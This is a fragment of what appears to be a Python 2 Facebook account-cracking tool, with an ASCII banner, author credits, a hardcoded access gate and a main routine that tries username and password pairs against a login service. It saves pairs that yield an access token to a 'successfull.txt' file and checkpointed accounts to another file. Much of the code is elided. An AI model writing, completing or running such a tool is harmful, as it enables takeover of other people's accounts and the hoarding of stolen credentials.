...
##    ##  ##  ##     ## ##     ## 
 ######  #### ##     ## ##     ## 
  ...
  Author  :  SIAM HOSSEN                                Github  :  SIAMVAU69
...
"""[1;33;40m--------------------------------------------------\n  \x1b[1;36;40mAuthor     \x1b[1;33;40m: \x1b[0;37;40mSIAM HOSSEN\n  \x1b[1;36;40mFacebook    \x1b[1;33;40m: \x1b[0;37;40mSIAM HOSSEN\n  \x1b[1;36;40mGithub   \x1b[1;33;40m: \x1b[0;37;40m SIAMVAU69\n  \x1b[1;36;40mPublic     \x1b[1;33;40m: \x1b[0;37;40m12-05-2022\n\x1b[1;33;40m--------------------------------------------------\n  """                            

os.system('clear')
print logo
CorrectUsername = 'Don69'
CorrectPassword = 'Don69'
loop = 'true'
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://github.com/SIAMVAU69')
    else:
        print '\x1b[1;91mWrong!,\x1b[1;92mText me to get the correct username'
        os.system('xdg-open www.facebook.com/M4F1A.BOY.S14M.OK3')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*Siam Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('siam/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[SIAM CP] Login After 9 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('siam/checkpoint.txt', 'a')
